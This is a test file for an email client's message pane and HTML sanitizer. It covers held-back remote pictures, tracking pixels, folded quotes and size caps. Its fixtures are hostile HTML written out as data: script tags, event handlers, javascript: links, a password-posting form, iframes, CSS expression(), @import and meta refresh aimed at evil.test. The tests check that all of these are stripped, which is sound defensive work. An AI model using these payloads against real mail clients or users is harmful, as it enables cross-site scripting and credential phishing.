/**
 * The message body as the owner reads it (host API 1.30): sanitised HTML with
 * remote pictures held back per sender, earlier messages folded, the plain
 * text with its links — and nothing fetched from anywhere until he asks.
 */
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import '@testing-library/jest-dom/vitest';
import { fireEvent, render, screen } from '@testing-library/react';
import { MessageBody } from './MessageBody';
import { MAX_DEPTH, MAX_HTML_CHARS, imageSenders, linkify, rememberImages, sanitizeHtml, splitQuotes } from './sanitize';

/* Mail bodies the pane is tested against, each a thing real mail does. Made-up hosts; nothing here ships. */

/** A newsletter: a remote hero picture, a 1×1 tracking pixel, a hidden one. */
const TRACKING_PIXEL = `<html><head><style>.x{color:red}</style></head><body>
<table width="600" align="center" bgcolor="#ffffff"><tr><td style="padding: 16px; font-family: Georgia">
<img src="https://news.test/hero.jpg" alt="This week's picture" width="560">
<p style="font-size: 18px">The week in three lines.</p>
<img src="https://track.test/open.gif?u=42" width="1" height="1" alt="">
<img src="https://track.test/hidden.gif" style="display: none">
</td></tr></table></body></html>`;

/** A reply with the earlier messages quoted inside each other, Gmail-style. */
const NESTED_QUOTES = `<div dir="ltr">Thursday works. I'll bring the signed copy.</div>
<div class="gmail_quote"><div class="gmail_attr">On Tue, 6 Oct 2026, Ana Duarte &lt;ana@studio.test&gt; wrote:</div>
<blockquote class="gmail_quote">Could we meet Thursday instead?
<div class="gmail_quote"><div class="gmail_attr">On Mon, 5 Oct 2026, you wrote:</div>
<blockquote class="gmail_quote">Shall we meet Wednesday to sign?</blockquote></div>
</blockquote></div>`;

/** Everything a hostile sender might try. */
const DANGEROUS_HTML = `<html><head><script>window.stolen = 1</script>
<link rel="stylesheet" href="https://evil.test/a.css"><meta http-equiv="refresh" content="0;url=https://evil.test"></head>
<body onload="window.stolen = 2">
<p onclick="window.stolen = 3" style="color: green; position: fixed; top: 0; background: url(https://evil.test/bg.png)">Pay attention</p>
<a href="javascript:window.stolen=4">Click me</a>
<a href="https://bank.test/login" onmouseover="window.stolen=5">Your bank</a>
<form action="https://evil.test/post"><input name="password" placeholder="Password"><button>Sign in</button></form>
<iframe src="https://evil.test/frame"></iframe>
<object data="https://evil.test/x.swf"></object>
<svg><script>window.stolen = 6</script><circle r="4"/></svg>
<img src="x" onerror="window.stolen = 7" alt="broken">
<div style="width: expression(alert(1)); color: #333">Styled safely</div>
<style>body { display: none }</style>
</body></html>`;

/** The quieter tricks: every one of them must be gone from what is drawn. */
const HOSTILE_HTML = `<html><head><base href="https://evil.test/"><meta http-equiv="refresh" content="0;url=https://evil.test/meta">
<style>@import "https://evil.test/import.css";</style></head><body>
<p>Still readable</p>
<img src="https://pics.test/a.png" srcset="https://evil.test/srcset.png 2x" alt="Hero">
<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=" alt="svg picture">
<svg><foreignObject><div onclick="window.stolen = 8">inside svg</div></foreignObject></svg>
<div style="color: red; background: @import 'https://evil.test/i.css'">imported</div>
<form action="https://evil.test/post"><input name="pw"></form>
<a href="https://ok.test/" onfocus="window.stolen = 9" onpointerdown="window.stolen = 10">ok</a>
<div onmouseenter="window.stolen = 11" onanimationstart="window.stolen = 12">hover</div>
</body></html>`;

/** A message that tries to lay itself over the pane: pulled up, pushed out, floated wide. */
const OVERLAY_HTML = `<div style="margin-top: -400px; margin-left: -2em; text-indent: -9999px; color: blue">Pulled up</div>
<div style="width: 300%; height: 250vh; min-width: 150vw; max-width: calc(100% + 400px); float: right">Wide</div>
<table width="900%"><tr><td>Cell</td></tr></table>
<div style="width: 80%; margin: 8px 0">Fine</div>`;

/** A picture carried in the message itself, named by its Content-ID. */
const CID_IMAGE = `<p>Our logo, as agreed:</p><img src="cid:logo@studio.test" alt="Studio logo" width="120">`;

/** A plain-text reply: a link, the attribution line, and a quote inside a quote. */
const PLAIN_WITH_QUOTES = `Sounds good — the draft is at https://docs.test/contract?v=2.
See you Thursday.

On Tue, 6 Oct 2026, Ana Duarte wrote:
> Could we meet Thursday instead?
>
> On Mon, 5 Oct 2026, you wrote:
>> Shall we meet Wednesday to sign?
`;

const cidSrc = (id: string): string => `/api/artifacts/${id}/preview`;

beforeEach(() => {
  window.localStorage.clear();
  delete (window as { stolen?: unknown }).stolen;
});

afterEach(() => {
  vi.restoreAllMocks();
});

describe('a remote picture', () => {
  it('is held back until the owner shows pictures, and a tracking pixel never loads', () => {
    const { container } = render(<MessageBody html={TRACKING_PIXEL} sender="news@news.test" cidSrc={cidSrc} />);
    // Nothing that would fetch: no <img> at all while held back.
    expect(container.querySelectorAll('img')).toHaveLength(0);
    expect(screen.getByText(/One picture is held back/)).toBeInTheDocument();
    expect(screen.getByText("This week's picture")).toHaveClass('pl-mail-img-held');
    expect(screen.getByText('The week in three lines.')).toBeInTheDocument();

    fireEvent.click(screen.getByRole('button', { name: 'Show images' }));
    const images = [...container.querySelectorAll('img')];
    expect(images.map((img) => img.getAttribute('src'))).toEqual(['https://news.test/hero.jpg']);
    expect(images[0]).toHaveAttribute('referrerpolicy', 'no-referrer');
    // The pixel and the hidden one are dropped even with pictures shown.
    expect(container.innerHTML).not.toContain('track.test');
  });

  it('remembers the choice per sender, and only for that sender', () => {
    const first = render(<MessageBody html={TRACKING_PIXEL} sender="News@News.test" cidSrc={cidSrc} />);
    fireEvent.click(screen.getByRole('button', { name: 'Show images' }));
    first.unmount();
    expect(imageSenders().has('news@news.test')).toBe(true);

    const again = render(<MessageBody html={TRACKING_PIXEL} sender="news@news.test" cidSrc={cidSrc} />);
    expect(again.container.querySelectorAll('img')).toHaveLength(1);
    // A way back: hide them again, remembered too.
    fireEvent.click(screen.getByRole('button', { name: 'Hide pictures from this sender' }));
    expect(again.container.querySelectorAll('img')).toHaveLength(0);
    expect(imageSenders().has('news@news.test')).toBe(false);
    again.unmount();

    const other = render(<MessageBody html={TRACKING_PIXEL} sender="other@news.test" cidSrc={cidSrc} />);
    expect(other.container.querySelectorAll('img')).toHaveLength(0);
  });

  it('keeps a choice to the sender it was made for when the pane is re-drawn for another', () => {
    const view = render(<MessageBody html={TRACKING_PIXEL} sender="news@news.test" cidSrc={cidSrc} />);
    fireEvent.click(screen.getByRole('button', { name: 'Show images' }));
    expect(view.container.querySelectorAll('img')).toHaveLength(1);
    // Same component, next conversation: the other sender's pictures stay held.
    view.rerender(<MessageBody html={TRACKING_PIXEL} sender="other@else.test" cidSrc={cidSrc} />);
    expect(view.container.querySelectorAll('img')).toHaveLength(0);
    expect(screen.getByRole('button', { name: 'Show images' })).toBeInTheDocument();
    // And back: the first sender's own answer still holds.
    view.rerender(<MessageBody html={TRACKING_PIXEL} sender="News@news.test " cidSrc={cidSrc} />);
    expect(view.container.querySelectorAll('img')).toHaveLength(1);
  });

  it('still shows pictures for the view when storage is unavailable, and never throws', () => {
    // A private window or blocked site data: even reaching `localStorage` throws.
    vi.spyOn(window, 'localStorage', 'get').mockImplementation(() => {
      throw new Error('blocked');
    });
    const { container } = render(<MessageBody html={TRACKING_PIXEL} sender="news@news.test" cidSrc={cidSrc} />);
    fireEvent.click(screen.getByRole('button', { name: 'Show images' }));
    expect(container.querySelectorAll('img')).toHaveLength(1);
    expect(() => rememberImages('a@b.test', true)).not.toThrow();
    expect(imageSenders().size).toBe(0);
  });
});

describe('dangerous HTML', () => {
  it('draws the words and nothing that runs, posts, frames or styles the page', () => {
    const { container } = render(<MessageBody html={DANGEROUS_HTML} sender="evil@evil.test" cidSrc={cidSrc} />);
    expect(screen.getByText('Pay attention')).toBeInTheDocument();
    expect(screen.getByText('Styled safely')).toBeInTheDocument();
    for (const tag of ['script', 'link', 'meta', 'form', 'input', 'button[type="submit"]', 'iframe', 'object', 'svg', 'style']) {
      expect(container.querySelector(`.pl-mail-html ${tag}`), tag).toBeNull();
    }
    const html = container.innerHTML;
    for (const gone of ['onclick', 'onload', 'onerror', 'onmouseover', 'javascript:', 'expression', 'url(', 'position', 'evil.test/a.css']) {
      expect(html, gone).not.toContain(gone);
    }
    // The javascript: link keeps its words and loses the link; the real one opens safely in a new tab.
    expect(screen.getByText('Click me').closest('a')).toBeNull();
    const bank = screen.getByText('Your bank').closest('a')!;
    expect(bank).toHaveAttribute('href', 'https://bank.test/login');
    expect(bank).toHaveAttribute('target', '_blank');
    expect(bank).toHaveAttribute('rel', 'noopener noreferrer');
    expect(screen.getByText('Pay attention')).toHaveStyle({ color: 'rgb(0, 128, 0)' });
    expect((window as { stolen?: unknown }).stolen).toBeUndefined();
  });
});

describe('a hostile message', () => {
  it('keeps none of srcset, base, svg foreignObject, svg data pictures, @import, meta refresh, forms or handlers', () => {
    const { container } = render(<MessageBody html={HOSTILE_HTML} sender="someone@sender.test" cidSrc={cidSrc} />);
    expect(screen.getByText('Still readable')).toBeInTheDocument();
    fireEvent.click(screen.getByRole('button', { name: 'Show images' }));
    for (const tag of ['base', 'meta', 'style', 'svg', 'foreignObject', 'form', 'input']) {
      expect(container.querySelector(`.pl-mail-html ${tag}`), tag).toBeNull();
    }
    const html = container.innerHTML;
    for (const gone of ['srcset', 'evil.test', 'data:image/svg', '@import', 'refresh', 'onfocus', 'onpointerdown', 'onmouseenter', 'onanimationstart', 'onclick', 'inside svg']) {
      expect(html, gone).not.toContain(gone);
    }
    expect([...container.querySelectorAll('img')].map((img) => img.getAttribute('src'))).toEqual(['https://pics.test/a.png']);
    expect(screen.getByRole('link', { name: 'ok' })).toHaveAttribute('href', 'https://ok.test/');
    expect((window as { stolen?: unknown }).stolen).toBeUndefined();
  });

  it('cannot pull itself over the pane: no negative lengths, sizes held to 100%', () => {
    const safe = sanitizeHtml(OVERLAY_HTML)!;
    const styles: Record<string, string>[] = [];
    const walk = (nodes: typeof safe.nodes): void => {
      for (const node of nodes) {
        if ('style' in node && node.style) styles.push(node.style);
        if ('kids' in node) walk(node.kids);
      }
    };
    walk(safe.nodes);
    const all = JSON.stringify(styles);
    expect(all).not.toMatch(/-\d/);
    expect(all).not.toMatch(/vw|vh|calc/);
    expect(styles).toContainEqual({ color: 'blue' });
    expect(styles).toContainEqual({ width: '100%', float: 'right' });
    expect(styles).toContainEqual({ width: '100%' });
    expect(styles).toContainEqual(expect.objectContaining({ width: '80%' }));
  });
});

describe('quoted earlier messages', () => {
  it('fold behind "earlier message", and a quote inside a quote folds again', () => {
    render(<MessageBody html={NESTED_QUOTES} sender="ana@studio.test" cidSrc={cidSrc} />);
    expect(screen.getByText("Thursday works. I'll bring the signed copy.")).toBeInTheDocument();
    expect(screen.queryByText(/Could we meet Thursday/)).not.toBeInTheDocument();
    fireEvent.click(screen.getByRole('button', { name: /earlier message/ }));
    expect(screen.getByText(/Could we meet Thursday/)).toBeInTheDocument();
    expect(screen.queryByText(/Shall we meet Wednesday/)).not.toBeInTheDocument();
    const inner = screen.getAllByRole('button', { name: /earlier message/ });
    fireEvent.click(inner[inner.length - 1]!);
    expect(screen.getByText(/Shall we meet Wednesday/)).toBeInTheDocument();
  });

  it('fold in plain text too, with the attribution line inside the fold and links that open safely', () => {
    const { container } = render(<MessageBody text={PLAIN_WITH_QUOTES} sender="ana@studio.test" cidSrc={cidSrc} />);
    const link = screen.getByRole('link', { name: 'https://docs.test/contract?v=2' });
    expect(link).toHaveAttribute('target', '_blank');
    expect(link).toHaveAttribute('rel', 'noopener noreferrer');
    // The full stop after the address is the sentence's.
    expect(container.textContent).toContain('?v=2.');
    expect(screen.queryByText(/Ana Duarte wrote/)).not.toBeInTheDocument();
    fireEvent.click(screen.getByRole('button', { name: /earlier message/ }));
    expect(screen.getByText(/Ana Duarte wrote/)).toBeInTheDocument();
    expect(screen.getByText(/Could we meet Thursday/)).toBeInTheDocument();
    expect(screen.queryByText(/Shall we meet Wednesday/)).not.toBeInTheDocument();
  });

  it('split as runs, the "Original Message" taking the rest', () => {
    expect(splitQuotes('Yes.\n\n-----Original Message-----\nFrom: Bo\nOld words')).toEqual([
      { t: 'text', v: 'Yes.\n' },
      { t: 'quote', head: null, inner: 'From: Bo\nOld words' },
    ]);
  });
});

describe('a cid: picture', () => {
  it('is drawn from the library once the file is there, and is its words until then', () => {
    const fetched = render(
      <MessageBody html={CID_IMAGE} sender="ana@studio.test" cidSrc={cidSrc} attachments={[{ contentId: '<logo@studio.test>', artifactId: 'art-9' }]} />,
    );
    expect(fetched.container.querySelector('img')).toHaveAttribute('src', '/api/artifacts/art-9/preview');
    // A cid: picture is never "remote": no Show images bar for it.
    expect(screen.queryByRole('button', { name: 'Show images' })).not.toBeInTheDocument();
    fetched.unmount();

    const listed = render(
      <MessageBody html={CID_IMAGE} sender="ana@studio.test" cidSrc={cidSrc} attachments={[{ contentId: 'logo@studio.test', artifactId: null }]} />,
    );
    expect(listed.container.querySelector('img')).toBeNull();
    expect(screen.getByText('Studio logo')).toHaveClass('pl-mail-img-held');
  });
});

describe('caps', () => {
  it('draws the text when the HTML is too long to parse', () => {
    const huge = `<p>${'x'.repeat(MAX_HTML_CHARS)}</p>`;
    expect(sanitizeHtml(huge)).toBeNull();
    render(<MessageBody html={huge} text="The plain words." sender="a@b.test" cidSrc={cidSrc} />);
    expect(screen.getByText('The plain words.')).toBeInTheDocument();
  });

  it('keeps only the text of what is nested past the depth cap, and says it was cut', () => {
    const deep = '<div>'.repeat(MAX_DEPTH + 20) + 'deep words' + '</div>'.repeat(MAX_DEPTH + 20);
    const safe = sanitizeHtml(deep)!;
    expect(safe.truncated).toBe(true);
    render(<MessageBody html={deep} sender="a@b.test" cidSrc={cidSrc} />);
    expect(screen.getByText('deep words')).toBeInTheDocument();
    expect(screen.getByText(/too long or too deeply nested/)).toBeInTheDocument();
  });

  it('only links http(s) in text', () => {
    expect(linkify('see ftp://x.test and javascript:alert(1) and http://ok.test/a).').filter((r) => r.t === 'link')).toEqual([
      { t: 'link', href: 'http://ok.test/a', v: 'http://ok.test/a' },
    ]);
  });
});
